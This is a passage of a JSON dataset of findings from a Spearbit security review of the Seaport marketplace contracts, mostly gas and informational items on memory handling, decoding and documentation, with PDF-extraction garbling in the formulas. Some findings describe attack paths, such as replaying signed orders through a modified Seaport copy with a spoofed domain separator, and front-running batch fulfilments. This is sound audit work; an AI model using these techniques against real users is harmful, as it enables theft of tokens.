        "body": "Among other things, the optimization steps are adding extra byte codes that are unnecessary for the dispatching mechanism. For example the Expression Simplifer is transforming the following calldata size comparisons: // slt(sub(calldatasize(), 4), X) push1 0x4 calldatasize sub slt into: // slt(add(calldatasize(), 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc), X) push32 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc calldatasize add slt And this happens for each exposed endpoint. This particular optimization rule is helpful if one could reorder and combine the constant value with another one ( A + (X (cid:0) B) ! (A (cid:0) B) + X , here A, B are constants and X is a variable ). But in this particular instance, the dispatcher does not perform better or worse in regards to the runtime code gas (it stays the same) but the optimization grows the bytecode size.  Note: The final bytecode depends on the options provided to solc. For the above finding, the default hardhat settings is used without the NO_SPECIALIZER flag.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The arithmetic in _validateOrderAndUpdateStatus can be simplified/optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "orderStatus.numerator and orderStatus.denominator contains multiple nested if/else blocks and for certain conditions/paths extra operations are performed. advancedOrder.numerator, arithmetic involving The variable description na advancedOrder.numerator 46 variable description da ns ds advancedOrder.denominator orderStatus.numerator orderStatus.denominator Depending on the case, the final outputs need to be:  Case 1. ds = 0 In this case na, da will be unmodified (besides the constraint checks)  Case 2. ds 6= 0, da = 1 In this case the remaining of the order will be filled and we would have (na, ns, da, ds) = (na, na, da, da) (na, ns, da, ds) = (ds (cid:0) ns, ds, ds, ds) Note that the invariant d (cid:21) n for new fractions and the combined ones is always guaranteed and so ds (cid:0) ns would not underflow.  Case 3. ds 6= 0, da 6= 1, da = ds Below (cid:15) = (na + ns > ds)(na + ns (cid:0) ds) is choosen so that order would not be overfilled. The parameters used in calculating (cid:15) are taken before they have been updated.  Case 4. ds 6= 0, da 6= 1, da 6= ds (na, ns, da, ds) = (na (cid:0) (cid:15), na + ns (cid:0) (cid:15), ds, ds) Below (cid:15) = (nads + nsda > dads)(nads + nsda (cid:0) dads) is choosen so that order would not be overfilled. And in case the new values go beyond 120 bits, G = gcd(nads (cid:0) (cid:15), nads + nsda (cid:0) (cid:15), dads), otherwise G will be 1. The parameters used in calculating (cid:15), G are taken before they have been updated. (na, ns, da, ds) = 1 G (nads (cid:0) (cid:15), nads + nsda (cid:0) (cid:15), dads, dads) If one of the updated values occupies more than 120 bits, the call will be reverted.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The magic return value checks can be made stricter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The magic return value check for ZoneInteraction can be made stricter. 1. It does not check the lower 28 bytes of the return value. 2. It does not check if extcodesize() of the zone is non-zero. In particular, for the identity precompile, the magic check would pass. This is, however, a general issue with the pattern where magic values are the same as the function selector and not specific to the Zone.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Resolving additional offer items supplied by contract orders with criteria can be impractical",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Contract orders can supply additional offer amounts when the order is executed. However, if they supply extra offer items with criteria, on the fly, the fulfiller won't be able to supply the necessary criteria resolvers (the correct Merkle proofs). This can lead to flaky orders that are impractical to fulfill.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of confusing named constant SpentItem_size in a function that deals with only ReceivedItem",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The named constant SpentItem_size is used in the function copyReceivedItemsAsConsidera- tionItems, even though the context has nothing to do with SpentItem.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The ABI-decoding of generateOrder returndata does not have sufficient checks to prevent out of bounds returndata reads",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There was some attempt to avoid out of bounds returndata access in the ConsiderationDecoder. However, the two returndatacopy(...) in ConsiderationDecoder.sol#L456-L461 can still lead to out of bounds access and therefore may revert. Assume that code reaches the line ConsiderationDecoder.sol#L456. We have the following constraints 1. returndatasize >= 4 * 32: ConsiderationDecoder.sol#L428 2. offsetOffer <= returndatasize: ConsiderationDecoder.sol#L444 3. offsetConsideration <= returndatasize: ConsiderationDecoder.sol#L445 If we pick a returndata that satisfies 1 and let offsetOffer == offsetConsideration == returndatasize, all the constraints are true. But the returndatacopy would be revert due to an out-of-bounds read. Note: High-level Solidity avoids reading from out of bounds returndata. This is usually done by checking if re- turndatasize() is large enough for static data types and always doing returndatacopy of the form returndata- copy(x, 0, returndatasize()).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming writeBytes to writeBytes32",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The function name writeBytes is not accurate in this context.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing test case for criteria-based contract orders and identifierOrCriteria != 0 case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The only test case for criteria-based contract orders in advanced.spec.ts#L434. This tests the case for identifierOrCriteria == 0. For the other case, identifierOrCriteria != 0 tests are missing.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "NatSpec comment for conduitKey in bulkTransfer() says \"optional\" instead of \"mandatory\"",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The NatSpec comment says that conduitKey is optional but there is a check making sure that this value is always supplied.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comparing the magic values returned by different contracts are inconsistent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In ZoneInteraction's _callAndCheckStatus we perform the following comparison for the returned magic value: let magic := shr(224, mload(callData)) magicMatch := eq(magic, shr(224, mload(0))) But the returned magic value comparison in _assertValidSignature without truncating the returned value: if iszero(eq(mload(0), EIP1271_isValidSignature_selector))",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the structure of the TypehashDirectory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Instances of TypehashDirectory would act as storage contracts with runtime bytecode: [0x00 - 0x00] 00 [0x01 - 0x20] h(struct BulkOrder { OrderComponents[2] [0x21 - 0x40] h(struct BulkOrder { OrderComponents[2][2] ... [0xNN - 0xMM] h(struct BulkOrder { OrderComponents[2][2]...[2] tree }) tree }) tree }) 56 h calculates the eip-712 typeHash of the input struct. 0xMM would be mul(MaxTreeHeight, 0x20) and 0xNN = 0xMM - 0x1f.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what twoSubstring encodes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "We have: bytes32 constant twoSubstring = 0x5B325D0000000000000000000000000000000000000000000000000000000000; which encodes: cast --to-ascii 0x5B325D0000000000000000000000000000000000000000000000000000000000 [2]",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Upper bits of the to parameter to call opcodes are stripped out by clients",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Upper bits of the to parameter to call opcodes are stripped out by clients. For example, geth would strip the upper bytes out:  instructions.go#L674  uint256.go#L114-L121 So even though the to parameters in this context can have dirty upper bits, the call opcodes can be successful, and masking these values in the contracts is not necessary for this context.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The functions in the above context are not used in the codebase.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fulfillment_itemIndex_offset can be used instead of OneWord",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the above context, one has: // Get the item index using the fulfillment pointer. itemIndex := mload(add(mload(fulfillmentHeadPtr), OneWord))",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document how the _pauser role is assigned for PausableZoneController",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The _pauser role is an important role for a PausableZoneController. It can pause any zone created by this controller and thus transfer all the native token funds locked in that zone to itself.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "_aggregateValidFulfillmentConsiderationItems's memory layout assumptions depend on _val- idateOrdersAndPrepareToFulfill's memory manipulation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ceivedItem.recipient's offset of considerationItemPtr to write to receivedItem at offset (the same offset is also used here): _aggregateValidFulfillmentConsiderationItems are we In the Re- the same // Set the recipient on the received item. mstore( add(receivedItem, ReceivedItem_recipient_offset), mload(add(considerationItemPtr, ReceivedItem_recipient_offset)) ) looks buggy, This tion[i].endAmount with consideration[i].recipient: but in _validateOrdersAndPrepareToFulfill(...) we overwrite considera- mstore( add( considerationItem, ReceivedItem_recipient_offset // old endAmount ), mload( add( considerationItem, ConsiderationItem_recipient_offset ) ) ) in _fulfillAvailableAdvancedOrders and Also _validateOrdersAndPrepareToFulfill gets called first _matchAdvancedOrders. This is important since the memory for the consideration arrays needs to be updated before we reach _aggregateValidFulfillmentConsiderationItems. 59",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "recipient is provided as the fulfiller for the OrderFulfilled event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the above context in general it is not true that the recipient is the fulfiller. Also note that recipient is address(0) for match orders.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "availableOrders[i] return values need to be explicitly assigned since they live in a region of memory which might have been dirtied before",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Seaport 1.1 did not have the following default assignment: if (advancedOrder.numerator == 0) { availableOrders[i] = false; continue; } But this is needed here since the current memory region which was previously used by the accumulator might be dirty.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Usage of MemoryPointer / formatting inconsistent in _getGeneratedOrder",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Usage of MemoryPointer / formatting is inconsistent between the loop used OfferItems and the loop used for ConsiderationItems.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "newAmount is not used in _compareItems",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "newAmount is unused in _compareItems. If originalItem points to I = (t, T , i, as, ae) and the newItem to Inew = (t 0, T 0, i 0, a0 s, a0 e) where parameter description t 0 t T , T 0 i 0 i as, a0 s ae, a0 e c then we have itemType itemType for I after the adjustment for restricted collection items token identifierOrCriteria identifierOrCriteria for I after the adjustment for restricted collection items startAmount endAmount _compareItems c(I, Inew ) = (t 6= t 0) _ (T 6= T 0) _ (i 6= i 0) _ (as 6= ae) and so we are not comparing either as to a0 enforced. In _getGeneratedOrder we have the following check: as > a0 errorBuffer. inequality is reversed for consideration items). And so in each loop (t 6= t 0) _ (T 6= T 0) _ (i 6= i 0) _ (as 6= ae) _ (as > a0 s or a0 s to a0 e. In abi_decode_generateOrder_returndata a0 s = a0 e is s (invalid case for offer items that contributes to s) is ored to errorBuffer.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "reformat validate so that its body is consistent with the other external functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "For consistency with other functions we can rewrite validate as: function validate( Order[] calldata /* orders */ ) external override returns (bool /* validated */ ) { return _validate(to_dyn_array_Order_ReturnType( abi_decode_dyn_array_Order )(CalldataStart.pptr())); } Needs to be checked if it changes code size or gas cost. Seaport: Fixed in PR 824. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add commented parameter names (Type Location /* name */)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Add commented parameter names (Type Location /* name */) for validate: Order[] calldata /* orders */ Seaport: Fixed in commit 74de34. Spearbit: Verified.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document that the height provided to _lookupBulkOrderTypehash can only be in a certain range",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Need to have height h provided to _lookupBulkOrderTypehash such that: 1 + 32(h (cid:0) 1) 2 [0, min(0xffffffffffffffff, typeDirectory.codesize) (cid:0) 32] Otherwise typeHash := mload(0) would be 0 or would be padded by zeros. When extcodecopy gets executed extcodecopy(directory, 0, typeHashOffset, 0x20) clients like geth clamp typehashOffset to minimum of 0xffffffff_ffffffff and directory.codesize and pads the result with 0s if out of range. ref:  instructions.go#L373 62  common.go#L54",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused imports can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The imported contents in this context are unused.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "msg.sender is provided as the fulfiller input parameter in a few locations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "msg.sender is provided as the fulfiller input parameter.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences and similarities of ConsiderationDecoder and solc when decoding dynamic arrays of static/fixed base struct type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The way OfferItem[] in abi_decode_dyn_array_OfferItem and ConsiderationItem[] in abi_- decode_dyn_array_ConsiderationItem are decoded are consistent with solc regarding this:  For dynamic arrays of static/fixed base struct type, the memory region looks like: 63 [mPtrLength --------------------------------------------------- [mPtrLength + 0x20: mPtrLength + 0x40) : mPtrLength + 0x20) arrLength memberTail1 - a memory pointer to the array's 1st element ,! ... [mPtrLength + ...: mPtrLength + ...) memberTailN - a memory pointer to the array's Nth element ,! --------------------------------------------------- [memberTail1 ... [memberTailN : memberTailN + <STRUCT_SIZE>) elementN : memberTail1 + <STRUCT_SIZE>) element1 The difference is solc decodes and validates (checking dirty bytes) each field of the elements of the array (which are static struct types) separately (one calldataload and validation per field per element). ConsiderationDecoder skips all those validations for both OfferItems[] and ConsiderationItems[] by copying a chunk of calldata to memory (the tail parts): calldatacopy( mPtrTail, add(cdPtrLength, 0x20), mul(arrLength, OfferItem_size) ) That means for OfferItem[], itemType and token (and also recipient for ConsiderationItem[]) fields can potentially have dirty bytes.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "PointerLibraries's malloc skips some checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "malloc in PointerLibraries skips checking if add(mPtr, size) is OOR or wraps around. Solidity does the following when allocating memory: 64 function allocate_memory(size) -> memPtr { memPtr := allocate_unbounded() finalize_allocation(memPtr, size) } function allocate_unbounded() -> memPtr { memPtr := mload(<freeMemoryPointer>) } function finalize_allocation(memPtr, size) { let newFreePtr := add(memPtr, round_up_to_mul_of_32(size)) // protect against overflow if or(gt(newFreePtr, 0xffffffff_ffffffff), lt(newFreePtr, memPtr)) { // <-- the check that is skipped panic_error_<code>() } mstore(<freeMemoryPointer>, newFreePtr) } function round_up_to_mul_of_32(value) -> result { result := and(add(value, 31), not(31)) } function panic_error_<code>() { // <selector> = cast sig \"Panic(uint256)\" mstore(0, <selector>) mstore(4, <code>) revert(0, 0x24) } Also note, rounding up the size to the nearest word boundary is hoisted out of malloc.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi_decode_bytes can populate memory with dirty bytes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When abi_decode_bytes decodes bytes, it rounds its size and copies the rounded size from calldata to memory. This memory region might get populated with dirty bytes. So for example: For both signature and extraData we are using abi_decode_bytes. If the AdvancedOrder is tightly packed and:  If signature's length is not a multiple of a word (0x20) part of the extraData.length bytes will be copied/duplicated to the end of signature's last memory slot.  If extraData's length is not a multiple of a word (0x20) part of the calldata that comes after extraData's tail will be copied to memory. Even if AdvancedOrder is not tightly packed (tail offsets are multiple of a word relative to the head), the user can stuff the calldata with dirty bits when signature's or extraData's length is not a multiple of a word. And those dirty bits will be carried over to memory during decoding. Note, these extra bits will not be overridden or 65 cleaned during the decoding because of the way we use and update the free memory pointer (incremented by the rounded-up number to a multiple of a word).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi_encode_validateOrder reuses a memory region",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "It is really important to note that before abi_encode_validateOrder is called, _prepareBasicFul- fillmentFromCalldata(...) needs to be called to populate the memory region that is used for event OrderFul- filled(...) which can be reused/copied in this function: MemoryPointer.wrap(offerDataOffset).copy( dstHead.offset(tailOffset), offerAndConsiderationSize ); From when the memory region for OrderFulfilled(...) is populated till we reach this point, care needs to be taken to not modified that region. accumulator data is written to the memory after that region and the current implementation does not touch that region during the whole call after the event has been emitted.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "abi_encode_validateOrder writes to a memory region that might have been potentially dirtied by accumulator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In abi_encode_validateOrder potentially (in the future), we might be writing in an area where accumulator was used. And since the book-keeping for the accumulator does not update the free memory pointer, we need to make sure all bytes in the memory in the range [dst, dst+size) are fully updated/written to in this function.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorder writing to memory in ConsiderationEncoder to follow the order in struct definitions.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Reorder the memory writes in ConsiderationEncoder to follow the order in struct definitions.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "The compiled YUL code includes redundant consecutive validation of enum types",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Half the location where an enum type struct field has been used/accessed, the validation function for this enum type is performed twice: validator_assert_enum_<ENUM_NAME>(memPtr) validator_assert_enum_<ENUM_NAME>(memPtr)",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider writing tests for revert functions in ConsiderationErrors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ConsiderationErrors.sol is a new file and is untested. Writing test cases to make sure the revert functions are throwing the right errors is an easy way to prevent mistakes.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo in comment for the selector used in ConsiderationEncoder.sol#abi_encode_validateOrder()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Minor typo in comments: // Write ratifyOrder selector and get pointer to start of calldata dst.write(validateOrder_selector);",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "_contractNonces[offerer] gets incremented even if the generateOrder(...)'s return data does not satisfy all the constrainsts.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "_contractNonces[offerer] gets incremented even if the generateOrder(...)'s return data does not satisfy all the constraints. This is the case when errorBuffer !=0 and revertOnInvalid == false (ful- fillAvailableOrders, fulfillAvailableAdvancedOrders). In this case, Seaport would not call back into the contract offerer's ratifyOrder(...) endpoint. Thus, the next time this offerer receives a ratifyOrder(...) call from Seaport, the nonce shared with it might have incremented more than 1.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users need to be cautious about what proxied/modified Seaport or Conduit instances they approve their tokens to",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Seaport ( S ) uses EIP-712 domain separator to make sure that when users sign orders, the signed orders only apply to that specific Seaport by pinpointing its name, version, the chainid, and its address. The domain separator is calculated and cached once the Seaport contract gets deployed. The domain separator only gets recalculated when/if the chainid changes (in the case of a hard fork for example). Some actors can take advantage of this caching mechanism by deploying a contract ( S0 ) that :  Delegates some of its endpoints to Seaport or it's just a proxy contract.  Its codebase is almost identical to Seaport except that the domain separator actually replicates what the original Seaport is using. This only requires 1 or 2 lines of code change (in this case the caching mechanism is not important) function _deriveDomainSeparator() { ... // Place the address of this contract in the next memory location. mstore(FourWords, MAIN_SEAPORT_ADDRESS) // <--- modified line and perhaps the actor can define a ,! named constant Assume a user approves either: 1. Both the original Seaport instance and the modified/proxied instance or, 2. A conduit that has open channels to both the original Seaport instance and the modified/proxied instance. And signs an order for the original Seaport that in the 1st case doesn't use any conduits or in the 2nd case the order uses the approved conduit with 2 open channels. Then one can use the same signature once with the original Seaport and once with the modified/proxied one to receive more tokens than offerer / user originally had intended to sell.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "ZoneInteraction contains logic for both zone and contract offerers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "ZoneInteraction contains logic for both zone and contract offerers.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Orders of CONTRACT order type can lower the value of a token offered",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Sometimes tokens have extra value because of the derived tokens owned by them (for example an accessory for a player in a game). With the introduction of contract offerer, one can create a contract offerer that automatically lowers the value of a token, for example, by transferring the derived connected token to a different item when Seaport calls the generateOrder(...). When such an order is included in a collection of orders the only way to ensure that the recipient of the item will hold a token which value hasn't depreciated during the transaction is that the recipient would also need to use a kind of mirrored order that incorporates either a CONTRACT or restricted order type that can do a post-transfer check.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restricted order checks in case where offerer and the fulfiller are the same",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Seaport 1.2 disallowed skipping restricted order checks when offerrer and fulfiller are the same.  Remove special-casing for offerer-fulfilled restricted orders: Offerers may currently bypass restricted order checks when fulfilling their own orders. This complicates reasoning about restricted order validation, can aid in the deception of other offerers or fulfillers in some unusual edge cases, and serves little practical use. However, in the case of the offerer == fulfiller == zone, the check continues to be skipped.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clean up inline documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "The comments highlighted in Context need to be removed or updated.  Remove the following: 73 ConsiderationEncoder.sol:216: // @todo Dedupe some of this ConsiderationEncoder.sol:316: // @todo Dedupe some of this ZoneInteraction.sol:97: // bytes memory callData; ZoneInteraction.sol:100: // function(bytes32) internal view errorHandler; ZoneInteraction.sol:182: // let magicValue := shr(224, mload(callData))  ConsiderationStructs.sol#L167 and ZoneInteraction.sol#L82 contain an outdated comment about the extraData attribute. There is no longer a staticcall being done, and the function isValidOrderIn- cludingExtraData no longer exists.  The NatSpec comment for _assertRestrictedAdvancedOrderValidity mentions: /** * @dev Internal view function to determine whether an order is a restricted * * * * * order and, if so, to ensure that it was either submitted by the offerer or the zone for the order, or that the zone returns the expected magic value upon performing a staticcall to `isValidOrder` or `isValidOrderIncludingExtraData` depending on whether the order fulfillment specifies extra data or criteria resolvers. A few of the facts are not correct anymore: * This function is not a view function anymore and change the storage state either for a zone or a contract offerer. * It is not only for restricted orders but also applies to orders of CONTRACT order type. * It performs actuall calls and not staticcalls anymore. * it calls the isValidOrder endpoint of a zone or the ratifyOrder endpoint of a contract offerer depending on the order type. * If it is dealing with a restricted order, the check is only skipped if the msg.sender is the zone. Seaport is called by the offerer for a restricted order, the call to the zone is still performed. If  Same comments apply to _assertRestrictedBasicOrderValidity excluding the case when order is of CONTRACT order type.  Typos in TransferHelperErrors.sol - * @dev Revert with an error when a call to a ERC721 receiver reverts with + * @dev Revert with an error when a call to an ERC721 receiver reverts with  The @ NatSpec fields have an extra space in Consideration.sol: * @ <field> The extra space can be removed.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider writing tests for hard coded constants in ConsiderationConstants.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There are many hard coded constants, most being function selectors, that should be tested against.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused / Redundant imports in ZoneInteraction.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There are multiple unused / redundant imports.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Orders of CONTRACT order type do not enforce a usage of a specific conduit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "None of the endpoints (generateOrder and ratifyOrder) for an order of CONTRACT order type en- force using a specific conduit. A contract offerer can enforce the usage of a specific conduit or just Seaport by setting allowances or approval for specific tokens. If a caller calls into different Seaport endpoints and does not provide the correct conduit key, then the order would revert. Currently, the ContractOffererInterface interface does not have a specific endpoint to discover which conduits the contract offerer would prefer users to use. getMetadata() would be able to return a metadata that encodes the conduit key. For (advanced) orders of not CONTRACT order types, the offerer would sign the order and the conduit key is included in the signed hash. Thus, the conduit is enforced whenever that order gets included in a collection by an actor calling Seaport.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Calls to Seaport that would fulfill or match a collection of advanced orders can be front-ran to claim any unused offer items",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "Calls to Seaport that would fulfill or match a collection of advanced orders can be front-ran to claim any unused offer items. These endpoints include:  fulfillAvailableOrders  fulfillAvailableAdvancedOrders  matchOrders  matchAdvancedOrders Anyone can monitor the mempool to find calls to the above endpoints and calculate if there are any unused offer item amounts. If there are unused offer item amounts, the actor can create orders with no offer items, but with consideration items mirroring the unused offer items and populate the fulfillment aggregation data to match the 84 unused offer items with the new mirrored consideration items. It is possible that the call by the actor would be successful under certain conditions. For example, if there are orders of CONTRACT order type involved, the contract offerer might reject this actor (the rejection might also happen by the zones used when validating the order). But in general, this strategy can be implemented by anyone.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Advance orders of CONTRACT order types can generate orders with more offer items and the extra offer items might not end up being used.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide extra offer items for this order. These extra offer items might have not been known beforehand by the caller. And if the caller would not incorporate the indexes for the extra items in the fulfillment aggregation data, the extra items would end up not being aggregated into any executions.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typo for the index check comment in _aggregateValidFulfillmentConsiderationItems",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
